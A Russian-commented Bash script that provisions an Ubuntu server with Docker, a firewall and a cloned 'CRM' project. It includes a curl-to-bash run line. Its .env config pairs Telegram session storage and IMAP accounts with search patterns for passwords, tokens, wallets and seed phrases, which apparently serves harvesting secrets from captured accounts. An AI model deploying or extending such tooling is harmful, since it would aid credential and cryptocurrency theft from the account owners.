#!/bin/bash

# Полная автоматическая настройка сервера для CRM
# Запуск: bash <(curl -s https://raw.githubusercontent.com/arhteh596/-/main/server-setup.sh)

set -e

echo "========================================"
echo "НАСТРОЙКА СЕРВЕРА ДЛЯ CRM"
echo "========================================"
echo ""

# Цвета
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

log_info() { echo -e "${GREEN}[✓]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[✗]${NC} $1"; }

# Проверка root прав
if [ "$EUID" -ne 0 ]; then
    log_error "Запустите скрипт с правами root: sudo bash server-setup.sh"
    exit 1
fi

# 1. Обновление системы
log_info "Шаг 1/8: Обновление системы Ubuntu..."
apt-get update -qq
DEBIAN_FRONTEND=noninteractive apt-get upgrade -y -qq
log_info "Система обновлена"

# 2. Установка базовых пакетов
log_info "Шаг 2/8: Установка необходимых пакетов..."
DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg \
    lsb-release \
    git \
    nano \
    htop \
    ufw \
    wget \
    software-properties-common
log_info "Базовые пакеты установлены"

# 3. Установка Docker
log_info "Шаг 3/8: Установка Docker..."
if command -v docker &> /dev/null; then
    log_warn "Docker уже установлен"
else
    # Удаление старых версий
    apt-get remove -y docker docker-engine docker.io containerd runc 2>/dev/null || true
    
    # Добавление репозитория Docker
    install -m 0755 -d /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
    chmod a+r /etc/apt/keyrings/docker.gpg
    
    echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
      $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
    
    # Установка Docker
    apt-get update -qq
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
    
    # Запуск Docker
    systemctl start docker
    systemctl enable docker
    
    log_info "Docker установлен и запущен"
fi

# Проверка версии Docker
DOCKER_VERSION=$(docker --version)
log_info "Версия Docker: $DOCKER_VERSION"

# 4. Настройка файрвола UFW
log_info "Шаг 4/8: Настройка файрвола..."
ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp comment 'SSH'
ufw allow 80/tcp comment 'HTTP'
ufw allow 443/tcp comment 'HTTPS'
ufw --force enable
log_info "Файрвол настроен (SSH, HTTP, HTTPS)"

# 5. Создание структуры директорий
log_info "Шаг 5/8: Создание директорий проекта..."
mkdir -p /opt/crm
mkdir -p /opt/crm/backups
mkdir -p /opt/crm/uploads/avatars
mkdir -p /opt/crm/uploads/csv
mkdir -p /opt/crm/telegram-sessions
mkdir -p /opt/crm/backend/logs
log_info "Структура директорий создана"

# 6. Клонирование репозитория
log_info "Шаг 6/8: Клонирование проекта с GitHub..."
cd /opt
if [ -d "/opt/crm/.git" ]; then
    log_warn "Репозиторий уже существует, обновляем..."
    cd /opt/crm
    git pull
else
    rm -rf /opt/crm/*
    git clone https://github.com/arhteh596/-.git /opt/crm
fi
log_info "Код проекта загружен"

# 7. Настройка переменных окружения
log_info "Шаг 7/8: Настройка переменных окружения..."
cd /opt/crm

# Генерация паролей
DB_PASSWORD=$(openssl rand -base64 24 | tr -d "=+/" | cut -c1-24)
JWT_SECRET=$(openssl rand -base64 32)

# Создание .env файла
cat > .env << EOF
# ===== Production Environment =====
# Database
POSTGRES_DB=crm_db
POSTGRES_USER=crm_user
POSTGRES_PASSWORD=${DB_PASSWORD}
DB_USER=crm_user
DB_PASSWORD=${DB_PASSWORD}
DB_NAME=crm_db
DB_HOST=postgres
DB_PORT=5432
DB_SSL=false

# Auth
JWT_SECRET=${JWT_SECRET}
JWT_EXPIRY=7d

# Application
NODE_ENV=production
PORT=3000

# Telegram API (optional)
TELEGRAM_PRIMARY_API_ID=
TELEGRAM_PRIMARY_API_HASH=
TELEGRAM_FALLBACK_API_ID=
TELEGRAM_FALLBACK_API_HASH=
TELEGRAM_SESSION_PATH=/app/telegram-sessions

# Email/IMAP (optional)
EMAIL_LIST=
EMAIL_LIST_JSON=
EMAIL_ACCOUNTS_JSON=
IMAP_SERVER=imap.gmail.com
IMAP_PORT=993
IMAP_USER=
IMAP_PASSWORD=

# Patterns
SEARCH_PATTERNS=пароль,password,pass,логин,login,крипта,crypto,ключ,key,токен,token,секрет,secret,wallet,кошелек,seed,сид,phrase
CRYPTO_WALLET_BOTS=@wallet,@CryptoBot,@BitcoinWalletBot

# Web Push VAPID (optional)
VAPID_PUBLIC_KEY=
VAPID_PRIVATE_KEY=
VAPID_CONTACT_EMAIL=mailto:admin@granovski-crm.site

# Frontend build
VITE_API_URL=https://granovski-crm.site/api

# Domain
DOMAIN=granovski-crm.site
EOF

chmod 600 .env
log_info ".env файл создан с надежными паролями"

# Сохранение паролей в отдельный файл
cat > /root/crm-passwords.txt << EOF
======================================
CRM PASSWORDS
======================================
Database Password: ${DB_PASSWORD}
JWT Secret: ${JWT_SECRET}

Default Admin:
  Login: admin
  Password: admin (CHANGE IMMEDIATELY!)

Generated: $(date)
======================================
EOF
chmod 600 /root/crm-passwords.txt
log_info "Пароли сохранены в /root/crm-passwords.txt"

# 8. Установка прав доступа
log_info "Шаг 8/8: Настройка прав доступа..."
chown -R root:root /opt/crm
chmod -R 755 /opt/crm
chmod 600 /opt/crm/.env
chmod +x /opt/crm/deploy-production.sh 2>/dev/null || true
log_info "Права доступа настроены"

# Итоговая информация
echo ""
echo "========================================"
echo -e "${GREEN}СЕРВЕР НАСТРОЕН УСПЕШНО!${NC}"
echo "========================================"
echo ""
echo "Информация о системе:"
echo "  - Docker: $(docker --version | cut -d' ' -f3)"
echo "  - Docker Compose: $(docker compose version --short)"
echo "  - Проект: /opt/crm"
echo "  - Пароли: /root/crm-passwords.txt"
echo ""
echo "Следующие шаги:"
echo "  1. Проверьте пароли: cat /root/crm-passwords.txt"
echo "  2. Запустите развертывание: cd /opt/crm && ./deploy-production.sh"
echo ""
echo "Файрвол (UFW):"
ufw status numbered
echo ""
echo "========================================"
